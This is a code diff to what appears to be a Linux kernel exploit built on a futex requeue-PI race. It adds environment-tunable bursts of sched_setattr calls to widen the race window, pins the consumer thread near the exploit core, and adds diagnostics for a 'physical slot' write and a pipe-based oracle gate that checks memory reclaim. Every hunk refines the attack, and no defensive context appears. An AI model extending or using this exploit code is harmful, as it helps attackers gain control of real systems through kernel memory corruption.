@@ -342,7 +342,7 @@ void slide_pselect_stack_copy(void) {
 
 void *slide_consumer_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
-  pin_to_core(CONSUMER_CORE);
+  pin_to_core(exploit_core() + 1);
   atomic_store(&slide_consumer_ready, 1);
   int *errno_ptr = &errno;
 
@@ -369,19 +369,46 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
       usleep(slide_enter_delay_usec());
     }
 
+    int burst = 1;
+    const char *burst_env = getenv("SLIDE_CONSUMER_BURST");
+    if (burst_env && *burst_env) {
+      char *end = NULL;
+      errno = 0;
+      long value = strtol(burst_env, &end, 0);
+      if (!errno && end != burst_env && !*end && value >= 1 && value <= 32) {
+        burst = (int)value;
+      }
+    }
+    int spacing_usec = 0;
+    const char *spacing_env = getenv("SLIDE_CONSUMER_SPACING_USEC");
+    if (spacing_env && *spacing_env) {
+      char *end = NULL;
+      errno = 0;
+      long value = strtol(spacing_env, &end, 0);
+      if (!errno && end != spacing_env && !*end && value >= 0 &&
+          value <= 100000) {
+        spacing_usec = (int)value;
+      }
+    }
+
     int tid = atomic_load(&slide_waiter_tid);
-    int calls = atomic_load(&slide_consume_calls);
-    int entered = atomic_load(&slide_consume_enter_sched) + 1;
-    atomic_store(&slide_consume_enter_sched, entered);
-    atomic_store(&slide_consume_calls, calls + 1);
-    *errno_ptr = 0;
-    long ret = sched_setattr_tid(tid, (calls % 19) + 1);
-    int saved_errno = *errno_ptr;
-    atomic_store(&slide_consume_last_sched_ret, (int)ret);
-    atomic_store(&slide_consume_last_sched_errno, saved_errno);
-    if (ret == 0) {
-      int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
-      atomic_store(&slide_consume_sched_ok, sched_ok);
+    for (int burst_idx = 0; burst_idx < burst; burst_idx++) {
+      int calls = atomic_load(&slide_consume_calls);
+      int entered = atomic_load(&slide_consume_enter_sched) + 1;
+      atomic_store(&slide_consume_enter_sched, entered);
+      atomic_store(&slide_consume_calls, calls + 1);
+      *errno_ptr = 0;
+      long ret = sched_setattr_tid(tid, (calls % 19) + 1);
+      int saved_errno = *errno_ptr;
+      atomic_store(&slide_consume_last_sched_ret, (int)ret);
+      atomic_store(&slide_consume_last_sched_errno, saved_errno);
+      if (ret == 0) {
+        int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
+        atomic_store(&slide_consume_sched_ok, sched_ok);
+      }
+      if (burst_idx + 1 < burst && spacing_usec > 0) {
+        usleep((useconds_t)spacing_usec);
+      }
     }
     atomic_store(&slide_consume_stop, 1);
     while (atomic_load(&slide_consume_go)) {
@@ -612,6 +639,8 @@ static int slide_child_trigger_write(void) {
       usleep(SLIDE_REQUEUE_POLL_USEC);
     }
   }
+  pr_info("slide cmp_requeue_pi ret=%ld errno=%d polls=%d\n",
+          requeue_ret, requeue_errno, requeue_polls);
   if (requeue_ret != -1 || requeue_errno != EDEADLK) {
     return 0;
   }
@@ -656,6 +685,15 @@ static int slide_trigger_physical_slot(size_t slot) {
             "pad=%d\n",
             slot, delay, slide_pselect_nfds, slide_syscall_pad);
     return 1;
+  }
+  if (getenv("P0_ORACLE_GATE_DIAG") && slot == P0_ORACLE_GATE_SLOT) {
+    /* The write may have fired without opening the early-wake window
+     * (ret=0).  Verify the pipe oracle anyway so diagnostics can tell
+     * "silent write" apart from "reclaim miss / walk never happened".
+     * Done here because pr_error below exits the attempt process. */
+    int late_gate = verify_p0_pipe_oracle_gate();
+    pr_warning("p0 physical gate diagnostic (post-failure) result=%d\n",
+               late_gate);
   }
   pr_error("p0 physical slot=%zu write window failed after one attempt\n",
            slot);
